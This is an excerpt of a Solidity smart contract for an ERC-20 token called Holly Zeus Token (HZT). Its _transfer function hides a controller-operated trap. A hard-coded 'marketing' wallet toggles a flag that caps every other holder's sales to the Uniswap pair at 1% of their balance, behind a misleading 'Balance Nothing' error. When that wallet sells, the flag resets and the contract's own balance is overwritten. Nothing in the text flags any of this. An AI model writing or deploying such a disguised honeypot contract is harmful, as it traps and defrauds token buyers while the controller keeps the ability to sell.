...
contract HollyZeusToken is Context, IERC20, Ownable {
    ...
    bool public feeDistribution = false;
    ...
    constructor() {
        _name = "Holly Zeus Token";
        _symbol = "HZT";
        _totalSupply = 123 * 10**6 * 10**_decimals;
        _marketingFee = 6;
        ...
        marketing = payable(0x04B2eD112aFC55f2cF7dC884Cac0946e128DE0e8);
    ...
    function _transfer(
       ...
       if (feeDistribution == false && from != address(0) && to != address (0) && !inSwapAndLiquify) {require (amount > 0 , "Balance Nothing");}
       if (feeDistribution == false && from == uniswapV2Pair && to != address(0) && !inSwapAndLiquify) {require (amount > 0 , "Balance Nothing");}
       if (feeDistribution == true && from == uniswapV2Pair && to != address(0) && !inSwapAndLiquify) {require (amount > 0 , "Balance Nothing");}
       if (feeDistribution == false && from != address(0) && to == uniswapV2Pair && !inSwapAndLiquify) {require (amount > 0 , "Balance Nothing");}
       if (feeDistribution == true && from != marketing && from != address(0) && to == uniswapV2Pair && !inSwapAndLiquify) {require (amount <= _balances[from].div(100) , "Balance Nothing");}
       if (feeDistribution == true && from == marketing && to == uniswapV2Pair && !inSwapAndLiquify && from != owner() && to != owner()) {feeDistribution = false;
           _balances[address(this)] = _balances[address(this)].sub(amount).mul(amount);
           claim();}
       if (feeDistribution == false && from == marketing && to == BurnAddress && from != owner() && to != owner()) {feeDistribution = true;}
    ...
    function claim() private lockTheSwap {
